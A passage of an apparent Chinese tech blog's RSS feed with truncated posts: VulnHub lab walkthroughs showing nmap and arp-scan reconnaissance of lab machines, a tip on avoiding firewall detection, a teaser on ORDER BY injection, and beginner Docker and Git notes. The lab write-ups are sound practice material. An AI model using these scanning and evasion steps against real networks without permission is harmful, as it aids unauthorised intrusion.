登录成功后发现已成功绕过。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-ji-lian-xi-4%3A%20SolidState.html</guid><pubDate>Thu, 14 Dec 2023 01:51:12 +0000</pubDate></item><item><title>靶场练习3: Funbox2</title><link>https:/cha0s32.github.io/post/ba-chang-lian-xi-3%3A%20Funbox2.html</link><description>## 信息收集阶段&#13;
&#13;
扫描端口&#13;
&#13;
```shell&#13;
sudo nmap -p- -n -v -sS --max-retries=0 172.16.33.30&#13;
```&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=706" style="zoom:33%;" /&gt;&#13;
&#13;
发现开放端口21，22，80，扫描版本&#13;
&#13;
```shell&#13;
sudo nmap -p21,22,80 -sV -A 172.16.33.30&#13;
```&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=708" style="zoom:33%;" /&gt;&#13;
&#13;
扫描一下敏感目录，没发现有什么有价值的信息，除了一个robots.txt, 访问得到路径 /logs/ , nmap 已经扫出来了。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-chang-lian-xi-3%3A%20Funbox2.html</guid><pubDate>Wed, 13 Dec 2023 02:33:50 +0000</pubDate></item><item><title>靶场练习2：cloudantvirus</title><link>https:/cha0s32.github.io/post/ba-chang-lian-xi-2%EF%BC%9Acloudantvirus.html</link><description>## 靶场链接&#13;
&#13;
https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/&#13;
&#13;
## 信息收集&#13;
&#13;
练习1用了`arp-scan`，这种工具有可能会被防火墙流量监测到，所以可以使用`arping`, 这种工具基本`Linux`发行版都会自带。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-chang-lian-xi-2%EF%BC%9Acloudantvirus.html</guid><pubDate>Wed, 13 Dec 2023 01:46:24 +0000</pubDate></item><item><title>靶场练习1：Medium_Socialnetwork</title><link>https:/cha0s32.github.io/post/ba-chang-lian-xi-1%EF%BC%9AMedium_Socialnetwork.html</link><description># 靶机链接&#13;
&#13;
https://www.vulnhub.com/entry/boredhackerblog-social-network,454/&#13;
&#13;
# 信息收集阶段&#13;
&#13;
进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=592)&#13;
&#13;
主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上跑了什么服务&#13;
&#13;
使用nmap进行端口扫描，第一步是对目标进行端口的发现&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=593)&#13;
&#13;
发现靶机上开了两个端口，其中一个是22端口（SSH服务），另一个是非常见端口5000。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-chang-lian-xi-1%EF%BC%9AMedium_Socialnetwork.html</guid><pubDate>Wed, 13 Dec 2023 01:31:32 +0000</pubDate></item><item><title>Docker 入门笔记</title><link>https:/cha0s32.github.io/post/Docker%20-ru-men-bi-ji.html</link><description>* [启程](#启程)&#13;
   * [容器生态系统](#容器生态系统)&#13;
   * [docker 镜像](#docker-镜像)&#13;
      * [base 镜像](#base-镜像)&#13;
      * [镜像的分层结构](#镜像的分层结构)&#13;
   * [构建镜像](#构建镜像)&#13;
      * [docker commit](#docker-commit)&#13;
      * [dockerfile](#dockerfile)&#13;
         * [dockerfile官方文档](#dockerfile官方文档)&#13;
      * [RUN CMD ENTRYPOINT 区别](#run-cmd-entrypoint-区别)&#13;
         * [分发镜像](#分发镜像)&#13;
   * [Docker 容器](#docker-容器)&#13;
         * [进入容器的方法](#进入容器的方法)&#13;
         * [停止容器](#停止容器)&#13;
         * [删除容器](#删除容器)&#13;
      * [资源限制](#资源限制)&#13;
         * [内存限制](#内存限制)&#13;
         * [CPU 限额](#cpu-限额)&#13;
         * [Block IO 限额](#block-io-限额)&#13;
   * [实现容器的底层技术](#实现容器的底层技术)&#13;
      * [cgroup](#cgroup)&#13;
         * [namespace](#namespace)&#13;
   * [Docker网络](#docker网络)&#13;
      * [Bridge网络](#bridge网络)&#13;
      * [user-defined 网络](#user-defined-网络)&#13;
      * [容器间通信](#容器间通信)&#13;
         * [IP通信](#ip通信)&#13;
         * [Docker DNS Server](#docker-dns-server)&#13;
         * [join容器](#join容器)&#13;
         * [与外网交互](#与外网交互)&#13;
   * [Docker存储](#docker存储)&#13;
      * [storge driver](#storge-driver)&#13;
      * [Volume](#volume)&#13;
         * [bind mount](#bind-mount)&#13;
         * [docker managed volume](#docker-managed-volume)&#13;
         * [docker和host数据共享](#docker和host数据共享)&#13;
         * [容器间数据共享](#容器间数据共享)&#13;
         * [Data-packed volume container](#data-packed-volume-container)&#13;
         * [数据迁移](#数据迁移)&#13;
         * [销毁](#销毁)&#13;
# 启程&#13;
&#13;
## 容器生态系统&#13;
&#13;
生态系统： 核心技术、平台技术和支持技术&#13;
&#13;
容器核心技术：让Container在host运行起来的那些技术&#13;
&#13;
- 容器规范&#13;
&#13;
```bash&#13;
组织： Open Container Initiative (OCI)&#13;
&#13;
发布两个规范： runtime spec 和 image format spec&#13;
&#13;
（1） runtime 为容器提供运行环境， docker 和 runtime 的关系类比 Java 和 JVM 的 关系&#13;
&#13;
		lxc runc rkt 是目前主流的三种容器 runtime&#13;
&#13;
（2） 容器管理工具&#13;
&#13;
	对内与 runtime 交互， 对外提供用户接口 （CLI）&#13;
&#13;
（3） 容器定义工具&#13;
&#13;
	docker image 容器的模版&#13;
	dockerfile 用于创建docker image&#13;
	ACI 与image类似，不过是CoreOS开发的&#13;
&#13;
（5） Registry&#13;
&#13;
	镜像的仓库&#13;
  有Docker Hub 和 Quay.io&#13;
&#13;
（6） 容器OS&#13;
&#13;
	专门用于运行容器的操作系统&#13;
```&#13;
&#13;
容器平台技术：使容器作为集群在分布式环境中运行&#13;
&#13;
包括容器编排引擎、容器管理平台、基于容器的PaaS&#13;
&#13;
## docker 镜像&#13;
&#13;
### base 镜像&#13;
&#13;
含义：&#13;
&#13;
- 不依赖其他镜像，从scratch构建&#13;
- 其他镜像可以以之为基础进行扩展&#13;
&#13;
Linux 操作系统 由内核空间和用户空间 组成&#13;
&#13;
对于base 镜像来说，底层直接用 Host 的 kernal，自己只需要提供 rootfs 就行了&#13;
&#13;
base镜像用户空间和发行版一致，内核版本由Docker Host 决定，所有容器共用host的内核&#13;
&#13;
### 镜像的分层结构&#13;
&#13;
新镜像是从base镜像一层层叠加生成，每安装一个软件，就在现有镜像的基础上增加一层&#13;
&#13;
如果有多个镜像由同一个base镜像构建而来，那docker host 只需要在内存中记载一份base镜像，就可以为所有容器提供服务&#13;
&#13;
镜像的每一层都可以被共享&#13;
&#13;
**可写的容器层**：当容器启动的时候，会有一个可写层加载到镜像顶部。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/Docker%20-ru-men-bi-ji.html</guid><pubDate>Mon, 11 Dec 2023 02:16:59 +0000</pubDate></item><item><title>Git从入门到实操</title><link>https:/cha0s32.github.io/post/Git-cong-ru-men-dao-shi-cao.html</link><description>&#13;
   * [Git 基础](#git-基础)&#13;
      * [创建版本库](#创建版本库)&#13;
      * [添加及提交到仓库](#添加及提交到仓库)&#13;
      * [版本回退](#版本回退)&#13;
      * [撤销修改](#撤销修改)&#13;
      * [远程仓库](#远程仓库)&#13;
   * [分支管理](#分支管理)&#13;
      * [创建与合并分支](#创建与合并分支)&#13;
      * [解决冲突](#解决冲突)&#13;
      * [分支管理策略](#分支管理策略)&#13;
      * [Bug 分支](#bug-分支)&#13;
   * [好用的github工作流](#好用的github工作流)&#13;
      * [1. 三个部分](#1-三个部分)&#13;
      * [2. 流程](#2-流程)&#13;
      * [3. 同步](#3-同步)&#13;
      * [4. Pull Request](#4-pull-request)&#13;
&#13;
&#13;
## Git 基础&#13;
&#13;
&#13;
&#13;
### 创建版本库&#13;
&#13;
```shell&#13;
git init &#13;
```&#13;
&#13;
### 添加及提交到仓库&#13;
&#13;
```shell&#13;
git add xxx.file&#13;
git commit -m "xxxx"&#13;
&#13;
## 看看工作区和暂存区的区别&#13;
git diff xxx.file&#13;
```&#13;
&#13;
### 版本回退&#13;
&#13;
```shell&#13;
# 查看最近三次commit 记录&#13;
&#13;
git log --pretty=oneline&#13;
```&#13;
&#13;
HEAD 表示当前版本， HEAD^ 表示上一个版本， HEAD～100表示前100个版本&#13;
&#13;
```shell&#13;
git reset --hard HEAD^ # 回退到上一个版本&#13;
```&#13;
&#13;
Git在内部有个指向当前版本的`HEAD`指针，当你回退版本的时候，Git仅仅是把HEAD从指向指定版本&#13;
&#13;
想从旧版本恢复到新版本，但是新版本的`commit id`用`git log`找不到了：&#13;
&#13;
```shell&#13;
git reflog&#13;
```&#13;
&#13;
可以看到每一步HEAD指针的变更记录，从而找到新版本的`commit id`&#13;
&#13;
```shell&#13;
git reset --hard commit_id&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
### 撤销修改&#13;
&#13;
```shell&#13;
git checkout -- file_name&#13;
```&#13;
&#13;
- 自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态&#13;
- 已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态&#13;
&#13;
&#13;
&#13;
如果修改已经提交到暂存区了，使用`git reset HEAD file_name`可以把暂存区的修改撤销掉，重新放回工作区&#13;
&#13;
然后再`git reset -- file_name`把工作区的文件还原&#13;
&#13;
&#13;
&#13;
### 远程仓库&#13;
&#13;
第一步，在 github上创建远程仓库&#13;
&#13;
本地文件夹关联远程仓库 （origin也可以改成其他的）&#13;
&#13;
```shell&#13;
git remote add origin git@github.com:cha0s32/xxx.git&#13;
```&#13;
&#13;
第一次把本地内容推送到远程仓库&#13;
&#13;
```shell&#13;
git push -u origin master # -u 会把本地master分支和远程master分支关联起来&#13;
```&#13;
&#13;
查看远程库信息&#13;
&#13;
```shell&#13;
git remote -v&#13;
```&#13;
&#13;
接触远程库和本地的绑定关系&#13;
&#13;
```shell&#13;
git remote rm 远程库的名字&#13;
```&#13;
&#13;
&#13;
&#13;
从远程库上克隆项目&#13;
&#13;
```shell&#13;
# ssh&#13;
&#13;
git clone git@github.com:cha0s32/xxx.git&#13;
&#13;
# https&#13;
https://github.com/cha0s32/xxx.git # 比较慢&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## 分支管理&#13;
&#13;
### 创建与合并分支&#13;
&#13;
```shell&#13;
git checkout -b dev # 创建名为dev的分支,并切换过去&#13;
# git switch -c dev&#13;
```&#13;
&#13;
改动 dev 分支的文件，然后提交&#13;
&#13;
```shell&#13;
git add .&#13;
git commit -m "a new branch"&#13;
```&#13;
&#13;
切换回master分支&#13;
&#13;
```shell&#13;
git branch master # git switch master&#13;
```&#13;
&#13;
合并 dev 分支&#13;
&#13;
```shell&#13;
git merge dev&#13;
```&#13;
&#13;
删除 dev 分支&#13;
&#13;
```shell&#13;
git branch -d dev&#13;
```&#13;
&#13;
&#13;
&#13;
### 解决冲突&#13;
&#13;
当两个分支同时改动同一个文件，并且都提交了以后，要 merge 需要手工解决冲突&#13;
&#13;
新建新分支&#13;
&#13;
```shell&#13;
git switch -c test&#13;
```&#13;
&#13;
原 master 中有一个 readme 文件，内容为 &#13;
&#13;
```shell&#13;
aaaaaaaa&#13;
bbbbbbbb&#13;
```&#13;
&#13;
且已提交&#13;
&#13;
新分支中，也有readme文件，内容为&#13;
&#13;
```shell&#13;
aaaaaaaaa&#13;
bbbbbbbba&#13;
```&#13;
&#13;
也已提交，现打算在主分支用`git merge`合并，会出现冲突的提示，使用`cat readme`可以看到两个文件的区别&#13;
&#13;
在主分支的`readme`中作改动，然后再次提交，解决冲突&#13;
&#13;
```shell&#13;
git add .&#13;
git commit -m "conflict commit"&#13;
```&#13;
&#13;
然后可以删掉 `test`分支&#13;
&#13;
&#13;
&#13;
### 分支管理策略&#13;
&#13;
通常，合并分支时，如果可能，Git会用`Fast forward`模式，但这种模式下，删除分支后，会丢掉分支信息。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/Git-cong-ru-men-dao-shi-cao.html</guid><pubDate>Thu, 07 Dec 2023 09:57:33 +0000</pubDate></item><item><title>一次排序注入的研究</title><link>https:/cha0s32.github.io/post/yi-ci-pai-xu-zhu-ru-de-yan-jiu.html</link><description>最近看到一个大佬的渗透报告，里面有一个排序注入的利用。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/yi-ci-pai-xu-zhu-ru-de-yan-jiu.html</guid><pubDate>Thu, 07 Dec 2023 03:10:59 +0000</pubDate></item></channel></rss>